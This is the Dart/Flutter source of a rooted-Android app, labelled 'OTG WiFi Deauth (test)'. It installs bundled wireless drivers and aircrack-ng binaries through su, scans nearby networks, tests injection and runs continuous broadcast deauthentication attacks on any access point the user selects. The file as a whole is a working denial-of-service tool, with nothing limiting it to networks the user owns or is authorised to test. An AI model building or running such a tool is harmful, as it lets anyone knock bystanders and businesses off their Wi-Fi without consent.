import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:path_provider/path_provider.dart';
import 'dart:io';

void main() => runApp(const OtgApp());

const String wifiDir = '/data/local/tmp/wifi';
const List<String> payloadFiles = [
  'cfg80211.ko',
  'mac80211.ko',
  'rtl8xxxu.ko',
  'rtl8188fufw.bin',
  'iw',
  'deauth',
  'aireplay-ng',
  'airodump-ng',
  'engine.sh',
];

class OtgApp extends StatelessWidget {
  const OtgApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'OTG Deauth',
      theme: ThemeData.dark(useMaterial3: true),
      home: const HomePage(),
    );
  }
}

class Ap {
  final String bssid, ssid, freq, channel, signal;
  Ap(this.bssid, this.freq, this.channel, this.signal, this.ssid);
}

enum Phase { start, prepared, scanned }

class HomePage extends StatefulWidget {
  const HomePage({super.key});
  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {
  Phase phase = Phase.start;
  bool busy = false;
  String iface = '';
  String log = '';
  List<Ap> aps = [];
  String? deauthTarget;
  Process? deauthProc;

  String? _suPath;

  void _log(String s) {
    setState(() => log = '${DateTime.now().toString().substring(11, 19)}  $s\n$log');
  }

  Future<String?> _findSu() async {
    if (_suPath != null) return _suPath;
    const candidates = [
      '/product/bin/su',
      '/system/bin/su',
      '/system/xbin/su',
      '/sbin/su',
      '/debug_ramdisk/su',
      '/su/bin/su',
      'su',
    ];
    for (final p in candidates) {
      try {
        final r = await Process.run(p, ['-c', 'id']);
        if ('${r.stdout}'.contains('uid=0')) {
          _suPath = p;
          _log('root via $p');
          return p;
        }
      } catch (_) {}
    }
    return null;
  }

  Future<ProcessResult> _su(String cmd) async {
    final p = await _findSu();
    if (p == null) throw Exception('su not found or root denied');
    return Process.run(p, ['-c', cmd]);
  }

  Future<void> _extractPayload() async {
    final dir = await getApplicationSupportDirectory();
    final pdir = Directory('${dir.path}/payload');
    if (!pdir.existsSync()) pdir.createSync(recursive: true);
    for (final f in payloadFiles) {
      final data = await rootBundle.load('assets/payload/$f');
      final out = File('${pdir.path}/$f');
      await out.writeAsBytes(data.buffer.asUint8List(), flush: true);
    }
    final r = await _su(
        'mkdir -p $wifiDir/fw/rtlwifi && cp ${pdir.path}/* $wifiDir/ && '
        'mv -f $wifiDir/rtl8188fufw.bin $wifiDir/fw/rtlwifi/ && '
        'chmod 755 $wifiDir/iw $wifiDir/deauth $wifiDir/aireplay-ng $wifiDir/airodump-ng $wifiDir/engine.sh && echo COPIED');
    _log('extract: ${r.stdout}${r.stderr}'.trim());
  }

  Future<void> _prepare() async {
    setState(() => busy = true);
    try {
      _log('Requesting root (grant in the Magisk popup)...');
      final su = await _findSu();
      if (su == null) {
        _log('ERROR: root not granted / su not found. Open Magisk and allow this app, then retry.');
        return;
      }
      _log('root OK. Extracting driver payload...');
      await _extractPayload();
      _log('Swapping WiFi stack (internal WiFi goes down)...');
      final r = await _su('sh $wifiDir/engine.sh setup');
      _log('setup: ${r.stdout}${r.stderr}'.trim());
      if ('${r.stdout}'.contains('READY')) {
        setState(() => phase = Phase.prepared);
        _log('Driver stack loaded. Plug in the OTG adapter, then tap "Detect".');
      } else {
        _log('Setup failed. See log above.');
      }
    } catch (e) {
      _log('prepare error: $e');
    } finally {
      setState(() => busy = false);
    }
  }

  Future<void> _detect() async {
    setState(() => busy = true);
    try {
      final r = await _su('sh $wifiDir/engine.sh detect');
      final out = '${r.stdout}'.trim();
      if (out.startsWith('IFACE=')) {
        setState(() => iface = out.substring(6).trim());
        _log('Adapter found: $iface');
      } else {
        _log('No adapter yet. Plug it in and tap Detect again.');
      }
    } finally {
      setState(() => busy = false);
    }
  }

  Future<void> _scan() async {
    setState(() => busy = true);
    _log('Scanning...');
    try {
      final r = await _su('sh $wifiDir/engine.sh scan');
      final lines = '${r.stdout}'.split('\n').where((l) => l.contains('|'));
      final list = <Ap>[];
      for (final l in lines) {
        final p = l.split('|');
        if (p.length >= 5) {
          list.add(Ap(p[0].trim(), p[1].trim(), p[2].trim(), p[3].trim(), p.sublist(4).join('|').trim()));
        }
      }
      setState(() {
        aps = list;
        phase = Phase.scanned;
      });
      _log('Found ${list.length} networks.');
      if (list.isEmpty) _log('(empty — adapter may still be initializing; rescan)');
    } finally {
      setState(() => busy = false);
    }
  }

  Future<void> _testInjection() async {
    setState(() => busy = true);
    _log('Injection test (aireplay-ng -9)...');
    try {
      final r = await _su('sh $wifiDir/engine.sh test');
      final out = '${r.stdout}${r.stderr}'.trim();
      for (final l in out.split('\n')) {
        if (l.trim().isNotEmpty) _log(l.trim());
      }
      if (out.contains('Injection is working')) _log('>>> INJECTION WORKS <<<');
    } finally {
      setState(() => busy = false);
    }
  }

  Future<void> _startDeauth(Ap ap) async {
    if (deauthProc != null) {
      _log('Stop current deauth first.');
      return;
    }
    _log('Deauthing ${ap.ssid} (${ap.bssid}) ch${ap.channel} via aireplay-ng...');
    setState(() => deauthTarget = ap.bssid);
    final su = await _findSu();
    if (su == null) {
      _log('root lost');
      return;
    }
    // aireplay-ng --deauth 0 (continuous), broadcast, on the AP's freq
    deauthProc = await Process.start(su, ['-c', 'sh $wifiDir/engine.sh deauth ${ap.bssid} ${ap.freq} 0']);
    deauthProc!.stdout.transform(const SystemEncoding().decoder).listen((d) {
      if (d.trim().isNotEmpty) _log('deauth: ${d.trim()}');
    });
    deauthProc!.exitCode.then((_) {
      if (mounted) {
        setState(() {
          deauthProc = null;
          deauthTarget = null;
        });
      }
    });
  }

  Future<void> _stopDeauth() async {
    _log('Stopping deauth...');
    await _su('pkill -f "$wifiDir/deauth"');
    deauthProc?.kill();
    setState(() {
      deauthProc = null;
      deauthTarget = null;
    });
  }

  Future<void> _restore() async {
    final ok = await showDialog<bool>(
      context: context,
      builder: (c) => AlertDialog(
        title: const Text('Restore WiFi'),
        content: const Text('Reboot to restore internal WiFi. Continue?'),
        actions: [
          TextButton(onPressed: () => Navigator.pop(c, false), child: const Text('Cancel')),
          TextButton(onPressed: () => Navigator.pop(c, true), child: const Text('Reboot')),
        ],
      ),
    );
    if (ok == true) {
      await _stopDeauth();
      await _su('sh $wifiDir/engine.sh restore');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('OTG WiFi Deauth (test)'),
        actions: [
          IconButton(onPressed: busy ? null : _restore, icon: const Icon(Icons.restart_alt), tooltip: 'Restore WiFi (reboot)'),
        ],
      ),
      body: Padding(
        padding: const EdgeInsets.all(12),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            if (phase == Phase.start)
              FilledButton.icon(
                onPressed: busy ? null : _prepare,
                icon: const Icon(Icons.bolt),
                label: const Text('1. Prepare driver stack (internal WiFi goes down)'),
              ),
            if (phase == Phase.prepared) ...[
              Card(
                child: ListTile(
                  leading: const Icon(Icons.usb),
                  title: const Text('Plug in the OTG WiFi adapter'),
                  subtitle: Text(iface.isEmpty ? 'Then tap Detect.' : 'Adapter: $iface'),
                  trailing: FilledButton(onPressed: busy ? null : _detect, child: const Text('Detect')),
                ),
              ),
              if (iface.isNotEmpty)
                Row(children: [
                  Expanded(child: FilledButton.icon(onPressed: busy ? null : _scan, icon: const Icon(Icons.wifi_find), label: const Text('2. Scan'))),
                  const SizedBox(width: 8),
                  Expanded(child: FilledButton.tonalIcon(onPressed: busy ? null : _testInjection, icon: const Icon(Icons.bug_report), label: const Text('Test inject'))),
                ]),
            ],
            if (phase == Phase.scanned)
              Row(children: [
                Expanded(child: FilledButton.icon(onPressed: busy ? null : _scan, icon: const Icon(Icons.refresh), label: const Text('Rescan'))),
                const SizedBox(width: 8),
                Expanded(child: FilledButton.tonalIcon(onPressed: busy ? null : _testInjection, icon: const Icon(Icons.bug_report), label: const Text('Test inject'))),
              ]),
            const SizedBox(height: 8),
            Expanded(
              child: Column(
                children: [
                  Expanded(
                    flex: 3,
                    child: aps.isEmpty
                        ? const Center(child: Text('No networks yet'))
                        : ListView.builder(
                            itemCount: aps.length,
                            itemBuilder: (c, i) {
                              final ap = aps[i];
                              final active = deauthTarget == ap.bssid;
                              return Card(
                                color: active ? Colors.red.shade900 : null,
                                child: ListTile(
                                  title: Text(ap.ssid.isEmpty ? '(hidden)' : ap.ssid),
                                  subtitle: Text('${ap.bssid}  ch${ap.channel}  ${ap.signal}dBm'),
                                  trailing: active
                                      ? FilledButton(
                                          style: FilledButton.styleFrom(backgroundColor: Colors.red),
                                          onPressed: _stopDeauth,
                                          child: const Text('STOP'))
                                      : FilledButton.tonal(
                                          onPressed: deauthProc != null ? null : () => _startDeauth(ap),
                                          child: const Text('Deauth')),
                                ),
                              );
                            },
                          ),
                  ),
                  const Divider(),
                  Expanded(
                    flex: 2,
                    child: SingleChildScrollView(
                      child: Text(log, style: const TextStyle(fontFamily: 'monospace', fontSize: 11)),
                    ),
                  ),
                ],
              ),
            ),
            if (busy) const LinearProgressIndicator(),
          ],
        ),
      ),
    );
  }
}
